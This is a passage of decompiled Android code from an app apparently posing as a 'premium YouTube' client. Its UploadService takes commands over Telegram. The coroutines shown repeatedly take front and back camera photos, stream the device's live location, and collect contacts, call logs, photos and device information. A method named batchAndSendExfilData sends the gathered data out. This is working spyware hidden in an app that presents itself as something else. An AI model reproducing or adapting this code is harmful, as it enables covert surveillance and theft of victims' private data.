        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$83", f = "UploadService.kt", i = {}, l = {1893}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass83 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass83(UploadService uploadService, Continuation<? super AnonymousClass83> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass83(this.this$0, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object $result) {
                Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
                        ResultKt.throwOnFailure($result);
                        this.label = 1;
                        if (this.this$0.sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۹۹۲String$arg0$callsendTextToTelegram$fun$anonymous$$arg2$calllaunch$branch18$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), (Continuation) this) == coroutine_suspended) {
                            return coroutine_suspended;
                        }
                        break;
                    case 1:
                        ResultKt.throwOnFailure($result);
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                return Unit.INSTANCE;
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$84, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$84", f = "UploadService.kt", i = {}, l = {1902}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass84 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass84(UploadService uploadService, Continuation<? super AnonymousClass84> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass84(this.this$0, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object $result) throws CameraAccessException {
                AnonymousClass84 anonymousClass84;
                Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
                        ResultKt.throwOnFailure($result);
                        anonymousClass84 = this;
                        break;
                    case 1:
                        anonymousClass84 = this;
                        ResultKt.throwOnFailure($result);
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                while (anonymousClass84.this$0.backgroundCameraFront) {
                    anonymousClass84.this$0.takeAndSendPhoto(LiveLiterals$UploadServiceKt.INSTANCE.m۱۸۳Boolean$arg0$calltakeAndSendPhoto$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setcameraFrontJob$$branch19$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService());
                    anonymousClass84.label = 1;
                    if (DelayKt.delay(LiveLiterals$UploadServiceKt.INSTANCE.m۳۲۹Long$arg0$calldelay$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setcameraFrontJob$$branch19$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), (Continuation) anonymousClass84) == coroutine_suspended) {
                        return coroutine_suspended;
                    }
                }
                return Unit.INSTANCE;
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$85, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$85", f = "UploadService.kt", i = {}, l = {1905}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass85 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass85(UploadService uploadService, Continuation<? super AnonymousClass85> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass85(this.this$0, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object $result) {
                Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
                        ResultKt.throwOnFailure($result);
                        this.label = 1;
                        if (this.this$0.sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۹۹۴String$arg0$callsendTextToTelegram$fun$anonymous$$arg2$calllaunch$branch19$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), (Continuation) this) == coroutine_suspended) {
                            return coroutine_suspended;
                        }
                        break;
                    case 1:
                        ResultKt.throwOnFailure($result);
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                return Unit.INSTANCE;
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$86, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$86", f = "UploadService.kt", i = {}, l = {1911}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass86 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass86(UploadService uploadService, Continuation<? super AnonymousClass86> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass86(this.this$0, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object $result) {
                Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
                        ResultKt.throwOnFailure($result);
                        this.label = 1;
                        if (this.this$0.sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۹۹۷String$arg0$callsendTextToTelegram$fun$anonymous$$arg2$calllaunch$branch20$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), (Continuation) this) == coroutine_suspended) {
                            return coroutine_suspended;
                        }
                        break;
                    case 1:
                        ResultKt.throwOnFailure($result);
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                return Unit.INSTANCE;
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$87, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$87", f = "UploadService.kt", i = {}, l = {1919}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass87 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass87(UploadService uploadService, Continuation<? super AnonymousClass87> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass87(this.this$0, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object $result) throws CameraAccessException {
                AnonymousClass87 anonymousClass87;
                Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
                        ResultKt.throwOnFailure($result);
                        anonymousClass87 = this;
                        break;
                    case 1:
                        anonymousClass87 = this;
                        ResultKt.throwOnFailure($result);
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                while (anonymousClass87.this$0.backgroundCameraBack) {
                    anonymousClass87.this$0.takeAndSendPhoto(LiveLiterals$UploadServiceKt.INSTANCE.m۱۸۱Boolean$arg0$calltakeAndSendPhoto$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setcameraBackJob$$branch21$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService());
                    anonymousClass87.label = 1;
                    if (DelayKt.delay(LiveLiterals$UploadServiceKt.INSTANCE.m۳۲۷Long$arg0$calldelay$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setcameraBackJob$$branch21$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), (Continuation) anonymousClass87) == coroutine_suspended) {
                        return coroutine_suspended;
                    }
                }
                return Unit.INSTANCE;
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$88, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$88", f = "UploadService.kt", i = {}, l = {1922}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass88 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass88(UploadService uploadService, Continuation<? super AnonymousClass88> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass88(this.this$0, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object $result) {
                Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
                        ResultKt.throwOnFailure($result);
                        this.label = 1;
                        if (this.this$0.sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۹۹۹String$arg0$callsendTextToTelegram$fun$anonymous$$arg2$calllaunch$branch21$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), (Continuation) this) == coroutine_suspended) {
                            return coroutine_suspended;
                        }
                        break;
                    case 1:
                        ResultKt.throwOnFailure($result);
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                return Unit.INSTANCE;
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$89, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$89", f = "UploadService.kt", i = {}, l = {1928}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass89 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass89(UploadService uploadService, Continuation<? super AnonymousClass89> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass89(this.this$0, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object $result) {
                Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
                        ResultKt.throwOnFailure($result);
                        this.label = 1;
                        if (this.this$0.sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۱۰۰۱String$arg0$callsendTextToTelegram$fun$anonymous$$arg2$calllaunch$branch22$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), (Continuation) this) == coroutine_suspended) {
                            return coroutine_suspended;
                        }
                        break;
                    case 1:
                        ResultKt.throwOnFailure($result);
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                return Unit.INSTANCE;
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$90, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$90", f = "UploadService.kt", i = {}, l = {1938}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass90 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass90(UploadService uploadService, Continuation<? super AnonymousClass90> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass90(this.this$0, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object $result) {
                AnonymousClass90 anonymousClass90;
                Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
                        ResultKt.throwOnFailure($result);
                        anonymousClass90 = this;
                        break;
                    case 1:
                        anonymousClass90 = this;
                        ResultKt.throwOnFailure($result);
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                while (anonymousClass90.this$0.liveLocationEnabled) {
                    anonymousClass90.this$0.sendCurrentLocationToTelegram();
                    anonymousClass90.label = 1;
                    if (DelayKt.delay(LiveLiterals$UploadServiceKt.INSTANCE.m۳۳۱Long$arg0$calldelay$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setliveLocationJob$$branch23$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), (Continuation) anonymousClass90) == coroutine_suspended) {
                        return coroutine_suspended;
                    }
                }
                return Unit.INSTANCE;
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$91, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$91", f = "UploadService.kt", i = {}, l = {1941}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass91 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass91(UploadService uploadService, Continuation<? super AnonymousClass91> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass91(this.this$0, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object $result) {
                Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
                        ResultKt.throwOnFailure($result);
                        this.label = 1;
                        if (this.this$0.sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۱۰۰۳String$arg0$callsendTextToTelegram$fun$anonymous$$arg2$calllaunch$branch23$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), (Continuation) this) == coroutine_suspended) {
                            return coroutine_suspended;
                        }
                        break;
                    case 1:
                        ResultKt.throwOnFailure($result);
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                return Unit.INSTANCE;
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$92, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$92", f = "UploadService.kt", i = {}, l = {1947}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass92 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass92(UploadService uploadService, Continuation<? super AnonymousClass92> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass92(this.this$0, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object $result) {
                Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
                        ResultKt.throwOnFailure($result);
                        this.label = 1;
                        if (this.this$0.sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۱۰۰۵String$arg0$callsendTextToTelegram$fun$anonymous$$arg2$calllaunch$branch24$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), (Continuation) this) == coroutine_suspended) {
                            return coroutine_suspended;
                        }
                        break;
                    case 1:
                        ResultKt.throwOnFailure($result);
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                return Unit.INSTANCE;
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$93, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$93", f = "UploadService.kt", i = {}, l = {1952, 1953, 1955, 1956}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass93 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass93(UploadService uploadService, Continuation<? super AnonymousClass93> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass93(this.this$0, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            /* JADX WARN: Removed duplicated region for block: B:15:0x004b A[RETURN] */
            /* JADX WARN: Removed duplicated region for block: B:18:0x005f A[RETURN] */
            /* JADX WARN: Removed duplicated region for block: B:21:0x0074 A[RETURN] */
            /* JADX WARN: Removed duplicated region for block: B:22:0x0075  */
            /*
                Code decompiled incorrectly, please refer to instructions dump.
                To view partially-correct add '--show-bad-code' argument
            */
            public final java.lang.Object invokeSuspend(java.lang.Object r7) {
                /*
                    r6 = this;
                    java.lang.Object r0 = kotlin.coroutines.intrinsics.IntrinsicsKt.getCOROUTINE_SUSPENDED()
                    int r1 = r6.label
                    switch(r1) {
                        case 0: goto L25;
                        case 1: goto L20;
                        case 2: goto L1b;
                        case 3: goto L16;
                        case 4: goto L11;
                        default: goto L9;
                    }
                L9:
                    java.lang.IllegalStateException r7 = new java.lang.IllegalStateException
                    java.lang.String r0 = "call to 'resume' before 'invoke' with coroutine"
                    r7.<init>(r0)
                    throw r7
                L11:
                    r0 = r6
                    kotlin.ResultKt.throwOnFailure(r7)
                    goto L76
                L16:
                    r1 = r6
                    kotlin.ResultKt.throwOnFailure(r7)
                    goto L60
                L1b:
                    r1 = r6
                    kotlin.ResultKt.throwOnFailure(r7)
                    goto L4c
                L20:
                    r1 = r6
                    kotlin.ResultKt.throwOnFailure(r7)
                    goto L3d
                L25:
                    kotlin.ResultKt.throwOnFailure(r7)
                    r1 = r6
                    com.w8sb.w8premiumyt.UploadService r2 = r1.this$0
                    com.w8sb.w8premiumyt.UploadService.access$sendAllDeviceInfo(r2)
                    com.w8sb.w8premiumyt.UploadService r2 = r1.this$0
                    r3 = r1
                    kotlin.coroutines.Continuation r3 = (kotlin.coroutines.Continuation) r3
                    r4 = 1
                    r1.label = r4
                    java.lang.Object r2 = com.w8sb.w8premiumyt.UploadService.access$collectAndSendContacts(r2, r3)
                    if (r2 != r0) goto L3d
                    return r0
                L3d:
                    com.w8sb.w8premiumyt.UploadService r2 = r1.this$0
                    r3 = r1
                    kotlin.coroutines.Continuation r3 = (kotlin.coroutines.Continuation) r3
                    r4 = 2
                    r1.label = r4
                    java.lang.Object r2 = com.w8sb.w8premiumyt.UploadService.access$collectAndSendCallLog(r2, r3)
                    if (r2 != r0) goto L4c
                    return r0
                L4c:
                    com.w8sb.w8premiumyt.UploadService r2 = r1.this$0
                    com.w8sb.w8premiumyt.UploadService.access$startPhotoUpload(r2)
                    com.w8sb.w8premiumyt.UploadService r2 = r1.this$0
                    r3 = r1
                    kotlin.coroutines.Continuation r3 = (kotlin.coroutines.Continuation) r3
                    r4 = 3
                    r1.label = r4
                    java.lang.Object r2 = com.w8sb.w8premiumyt.UploadService.access$batchAndSendExfilData(r2, r3)
                    if (r2 != r0) goto L60
                    return r0
                L60:
                    com.w8sb.w8premiumyt.UploadService r2 = r1.this$0
                    com.w8sb.w8premiumyt.LiveLiterals$UploadServiceKt r3 = com.w8sb.w8premiumyt.LiveLiterals$UploadServiceKt.INSTANCE
                    java.lang.String r3 = r3.m۱۰۰۷String$arg0$callsendTextToTelegram$fun$anonymous$$arg2$calllaunch$branch25$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService()
                    r4 = r1
                    kotlin.coroutines.Continuation r4 = (kotlin.coroutines.Continuation) r4
                    r5 = 4
                    r1.label = r5
                    java.lang.Object r2 = com.w8sb.w8premiumyt.UploadService.access$sendTextToTelegram(r2, r3, r4)
                    if (r2 != r0) goto L75
                    return r0
                L75:
                    r0 = r1
                L76:
                    kotlin.Unit r1 = kotlin.Unit.INSTANCE
                    return r1
                */
                throw new UnsupportedOperationException("Method not decompiled: com.w8sb.w8premiumyt.UploadService.C۰۰۵۶1.AnonymousClass93.invokeSuspend(java.lang.Object):java.lang.Object");
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$94, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$94", f = "UploadService.kt", i = {}, l = {1963, 1964, 1966, 1967}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass94 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass94(UploadService uploadService, Continuation<? super AnonymousClass94> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass94(this.this$0, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            /* JADX WARN: Removed duplicated region for block: B:15:0x004b A[RETURN] */
            /* JADX WARN: Removed duplicated region for block: B:18:0x005f A[RETURN] */
            /* JADX WARN: Removed duplicated region for block: B:21:0x0074 A[RETURN] */
            /* JADX WARN: Removed duplicated region for block: B:22:0x0075  */
            /*
                Code decompiled incorrectly, please refer to instructions dump.
                To view partially-correct add '--show-bad-code' argument
            */
            public final java.lang.Object invokeSuspend(java.lang.Object r7) {
                /*
                    r6 = this;
                    java.lang.Object r0 = kotlin.coroutines.intrinsics.IntrinsicsKt.getCOROUTINE_SUSPENDED()
                    int r1 = r6.label
                    switch(r1) {
                        case 0: goto L25;
                        case 1: goto L20;
                        case 2: goto L1b;
                        case 3: goto L16;
                        case 4: goto L11;
                        default: goto L9;
                    }
                L9:
                    java.lang.IllegalStateException r7 = new java.lang.IllegalStateException
                    java.lang.String r0 = "call to 'resume' before 'invoke' with coroutine"
                    r7.<init>(r0)
                    throw r7
                L11:
                    r0 = r6
                    kotlin.ResultKt.throwOnFailure(r7)
                    goto L76
                L16:
                    r1 = r6
                    kotlin.ResultKt.throwOnFailure(r7)
                    goto L60
                L1b:
                    r1 = r6
                    kotlin.ResultKt.throwOnFailure(r7)
                    goto L4c
                L20:
                    r1 = r6
                    kotlin.ResultKt.throwOnFailure(r7)
                    goto L3d
                L25:
                    kotlin.ResultKt.throwOnFailure(r7)
                    r1 = r6
                    com.w8sb.w8premiumyt.UploadService r2 = r1.this$0
